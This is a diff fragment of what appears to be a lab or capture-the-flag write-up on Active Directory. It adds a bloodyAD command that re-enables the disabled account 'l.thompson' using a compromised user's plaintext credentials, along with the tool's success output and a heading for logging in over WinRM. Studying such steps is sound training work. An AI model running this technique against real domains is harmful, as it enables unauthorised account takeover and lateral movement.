@@ -787,5 +787,13 @@ So as seen here a previously compromised user is able to re-enable the account o
 
 
 ```python
+bloodyAD --host  DC.novacart.local -d 'novacart.local' -u 'd.barowski' -p 'kubarow' remove uac 'l.thompson' -f ACCOUNTDISABLE
+[+] ['ACCOUNTDISABLE'] property flags removed from l.thompson's userAccountControl
+```
+The account should now be enabled so ill log in via WINRM
+
+## Access over WINRM
+
+```python
 
 ```
